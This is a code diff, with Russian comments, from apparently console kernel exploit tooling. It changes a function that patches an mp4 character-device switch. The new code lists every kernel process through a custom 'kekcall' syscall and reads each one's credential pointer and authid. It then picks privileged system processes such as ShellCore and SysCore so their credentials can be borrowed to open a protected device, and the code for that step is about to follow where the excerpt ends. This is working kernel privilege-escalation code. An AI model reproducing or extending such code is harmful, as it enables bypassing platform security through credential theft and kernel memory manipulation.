@@ -785,90 +785,44 @@ find_and_patch_mp4_cdevsw(uint64_t curproc_hint)
     klog_printf("[READ_TEST] Step 2 (.rodata @ 0x%llx): ret=%ld, str='%.16s'\n",
                 (unsigned long long)rodata_v, r_rodata, rodata_bytes);
 
-    /* Шаг 3: Полная энумерация ВСЕХ процессов в ОБЕ стороны от curproc_hint */
-    klog_printf("[AUTH_ENUM] === ENUMERATING PROCESSES BIDIRECTIONALLY FROM curproc_hint=0x%llx ===\n",
-                (unsigned long long)curproc_hint);
+    /* Шаг 3: Полная энумерация ВСЕХ процессов через KEKCALL_ENUM_ALLPROC (nr 29) */
+    klog_printf("[AUTH_ENUM] === ENUMERATING ALL PROCESSES VIA KERNEL allproc SYMBOL (KEKCALL 29) ===\n");
 
     uint32_t candidate_pids[32] = {0};
     char candidate_comms[32][32] = {{0}};
     uint64_t candidate_authids[32] = {0};
     int ncandidates = 0;
 
-    /* Обход вперед (p_list.le_next @ proc + 0x10) и назад (p_list.le_prev @ proc + 0x08) */
-    sa.sa_handler = sigsys_handler;
-    sa.sa_flags = SA_NODEFER;
-    sigaction(SIGSYS, &sa, NULL);
+    /* Буфер для 128 процессов по 48 байт: pid(4), comm(24), ucred(8), authid(8) */
+    uint8_t proc_buf[128 * 48] = {0};
+    long total_procs = kekcall(KEKCALL_ENUM_ALLPROC, (uintptr_t)proc_buf, 128, 0);
+    klog_printf("[AUTH_ENUM] KEKCALL_ENUM_ALLPROC returned %ld processes\n", total_procs);
 
-    for (int dir = 0; dir < 2; dir++) {
-        uint64_t cur = curproc_hint;
-        for (int cnt = 0; cnt < 250 && cur; cnt++) {
-            if ((cur & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) break;
+    for (long i = 0; i < total_procs && i < 128; i++) {
+        uint8_t *entry = proc_buf + i * 48;
+        uint32_t pid = *(uint32_t*)(entry + 0);
+        char comm[25] = {0};
+        memcpy(comm, entry + 4, 24);
+        comm[24] = 0;
+        uint64_t ucred = *(uint64_t*)(entry + 28);
+        uint64_t authid = *(uint64_t*)(entry + 36);
 
-            uint64_t pid_u64 = 0;
-            char comm[32] = {0};
-            uint64_t ucred_ptr = 0;
-            uint64_t authid = 0;
+        klog_printf("[PROC] #%ld pid=%u comm='%s' ucred=0x%llx authid=0x%016llx\n",
+                    i, pid, comm, (unsigned long long)ucred, (unsigned long long)authid);
 
-            g_sigsys_fault = 0;
-            if (sigsetjmp(g_sigsys_jmp, 1) == 0) {
-                kekcall(KEKCALL_DUMP_MEM, cur + 0xBC, (uintptr_t)&pid_u64, 8);
-                kekcall(KEKCALL_DUMP_MEM, cur + 0x448, (uintptr_t)comm, 24);
-                kekcall(KEKCALL_DUMP_MEM, cur + 0x40, (uintptr_t)&ucred_ptr, 8);
-                if (ucred_ptr > 0xffff800000000000ULL) {
-                    kekcall(KEKCALL_DUMP_MEM, ucred_ptr + 0x58, (uintptr_t)&authid, 8);
-                }
-            } else {
-                break;
+        if (strstr(comm, "VideoCore") || strstr(comm, "MediaCore") ||
+            strstr(comm, "AvControl") || strstr(comm, "AvCapture") ||
+            strstr(comm, "audiod") || strstr(comm, "SysCore") ||
+            strstr(comm, "ShellCore") || strstr(comm, "decid") ||
+            ((authid >> 48) == 0x3800) || pid == 1) {
+            if (ncandidates < 32) {
+                candidate_pids[ncandidates] = pid;
+                strncpy(candidate_comms[ncandidates], comm, 31);
+                candidate_authids[ncandidates] = authid;
+                ncandidates++;
             }
-            if (g_sigsys_fault) break;
-
-            comm[23] = 0;
-            uint32_t pid = (uint32_t)(pid_u64 & 0xFFFFFFFF);
-
-            if (comm[0] && pid > 0) {
-                int dup = 0;
-                for (int i = 0; i < ncandidates; i++) {
-                    if (candidate_pids[i] == pid) { dup = 1; break; }
-                }
-
-                if (!dup) {
-                    klog_printf("[PROC] dir=%d #%d pid=%u comm='%s' ucred=0x%llx authid=0x%016llx\n",
-                                dir, cnt, pid, comm, (unsigned long long)ucred_ptr, (unsigned long long)authid);
-
-                    if (strstr(comm, "VideoCore") || strstr(comm, "MediaCore") ||
-                        strstr(comm, "AvControl") || strstr(comm, "AvCapture") ||
-                        strstr(comm, "audiod") || strstr(comm, "SysCore") ||
-                        strstr(comm, "ShellCore") || strstr(comm, "decid") ||
-                        ((authid >> 48) == 0x3800) || pid == 1) {
-                        if (ncandidates < 32) {
-                            candidate_pids[ncandidates] = pid;
-                            strncpy(candidate_comms[ncandidates], comm, 31);
-                            candidate_authids[ncandidates] = authid;
-                            ncandidates++;
-                        }
-                    }
-                }
-            }
-
-            /* Шаг перехода к следующему / предыдущему процессу */
-            uint64_t next_proc = 0;
-            if (sigsetjmp(g_sigsys_jmp, 1) == 0) {
-                if (dir == 0) {
-                    kekcall(KEKCALL_DUMP_MEM, cur + 0x10, (uintptr_t)&next_proc, 8);
-                } else {
-                    uint64_t prev_ptr = 0;
-                    kekcall(KEKCALL_DUMP_MEM, cur + 0x08, (uintptr_t)&prev_ptr, 8);
-                    next_proc = prev_ptr ? (prev_ptr - 0x10) : 0;
-                }
-            } else {
-                break;
-            }
-            if (g_sigsys_fault) break;
-            if (next_proc == curproc_hint) break;
-            cur = next_proc;
         }
     }
-    signal(SIGSYS, SIG_DFL);
 
     /* Шаг 3.1: Тест открытия /dev/mp4/dump_for_decid под кредами кандидатов (РОДНОЙ d_open БЕЗ ПАТЧА!) */
     klog_printf("[REAL_OPEN] === Testing native open under %d candidates (SAFETY: no intermediate klog during swap) ===\n", ncandidates);
